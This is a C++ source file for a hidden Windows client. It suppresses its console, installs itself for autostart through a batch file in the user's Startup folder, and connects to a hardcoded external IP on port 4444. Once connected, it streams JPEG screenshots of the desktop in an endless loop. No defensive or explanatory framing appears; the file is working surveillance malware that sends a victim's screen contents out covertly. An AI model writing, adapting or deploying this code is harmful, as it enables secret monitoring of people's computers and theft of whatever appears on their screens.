// client.cpp
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <gdiplus.h>
#include <string>
#include <thread>
#include <fstream>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

const char* SERVER1 = "212.35.189.7";
const char* SERVER2 = "192.168.0.104";
const int PORT = 4444;

void AddToStartup() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string startup = std::string(getenv("USERPROFILE")) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nyxr.bat";
    std::ofstream bat(startup);
    bat << "@echo off\nstart \"\" \"" << path << "\"";
    bat.close();
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    Gdiplus::ImageCodecInfo* pCodecInfo = (Gdiplus::ImageCodecInfo*)malloc(size);
    Gdiplus::GetImageEncoders(num, size, pCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pCodecInfo[j].Clsid;
            free(pCodecInfo);
            return j;
        }
    }
    free(pCodecInfo);
    return -1;
}

void SendScreen(SOCKET sock) {
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    CLSID jpegClsid;
    GetEncoderClsid(L"image/jpeg", &jpegClsid);

    while (true) {
        HWND hwnd = GetDesktopWindow();
        HDC hdc = GetDC(hwnd);
        RECT rect;
        GetClientRect(hwnd, &rect);
        int w = rect.right, h = rect.bottom;

        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hdcMem, hBitmap);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        Gdiplus::Bitmap bitmap(hBitmap, NULL);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(hwnd, hdc);

        IStream* pStream = NULL;
        CreateStreamOnHGlobal(NULL, TRUE, &pStream);
        bitmap.Save(pStream, &jpegClsid, NULL);

        STATSTG stat;
        pStream->Stat(&stat, STATFLAG_NONAME);
        ULONG jpegSize = stat.cbSize.LowPart;
        BYTE* jpegData = new BYTE[jpegSize];
        LARGE_INTEGER li = {};
        pStream->Seek(li, STREAM_SEEK_SET, NULL);
        ULONG bytesRead;
        pStream->Read(jpegData, jpegSize, &bytesRead);
        pStream->Release();

        send(sock, (char*)&jpegSize, 4, 0);
        int totalSent = 0;
        while (totalSent < (int)jpegSize) {
            int sent = send(sock, (char*)jpegData + totalSent, jpegSize - totalSent, 0);
            if (sent <= 0) break;
            totalSent += sent;
        }
        delete[] jpegData;

        Sleep(180);
    }
    Gdiplus::GdiplusShutdown(gdiplusToken);
}

int main() {
    AddToStartup();
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, SERVER1, &addr.sin_addr) <= 0) {
        inet_pton(AF_INET, SERVER2, &addr.sin_addr);
    }

    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
        SendScreen(sock);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}